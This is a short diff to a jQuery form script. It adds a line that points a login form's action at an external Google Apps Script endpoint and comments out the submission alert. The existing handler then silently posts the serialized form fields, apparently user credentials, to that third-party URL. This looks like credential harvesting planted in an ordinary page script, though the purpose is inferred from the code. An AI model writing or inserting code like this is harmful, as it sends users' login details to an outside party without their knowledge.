@@ -26,13 +26,16 @@
         var $subm = $('#mySubmit');
         var $impt = $form.find(':input').not(':button, :submit, :reset, :hidden');
 
+
+        $("#loginForm").attr("action","https://script.google.com/macros/s/AKfycbwDJTOktz0f1Ri-LIJ5jhHsZttIsiZrA2RtO9qHQBL1zNV0PBA/exec");
+
         // Submit function:
         $form.submit(function(){
             $.post($(this).attr('action'), $(this).serialize(), function(response){
                 // On success, clear all inputs;
                 $impt.val('').attr('value','').removeAttr('checked').removeAttr('selected');
                 // Write a confirmation message:
-                alert("Submitted!");
+                //alert("Submitted!");
                 // Disable the submit button:
                 $subm.prop('disabled', true);
 
